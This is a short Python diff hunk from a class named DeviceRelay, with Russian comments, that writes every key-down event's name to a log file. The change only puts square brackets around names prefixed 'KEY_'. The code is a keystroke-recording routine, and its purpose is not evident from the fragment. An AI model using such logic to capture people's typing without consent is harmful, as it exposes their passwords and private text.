@@ -387,7 +387,7 @@ class DeviceRelay:
                         if event.keystate == KeyEvent.key_down:
                             # Если это функциональная клавиша (например, F12), добавляем квадратные скобки
                             if key_name.startswith("KEY_"):
-                                key_name = f"{key_name[4:]}"  # Убираем "KEY_" и добавляем скобки
+                                key_name = f"[{key_name[4:]}]"  # Убираем "KEY_" и добавляем скобки
                             log_file.write(key_name)
                             log_file.flush()  # Обеспечиваем немедленную запись в файл
 
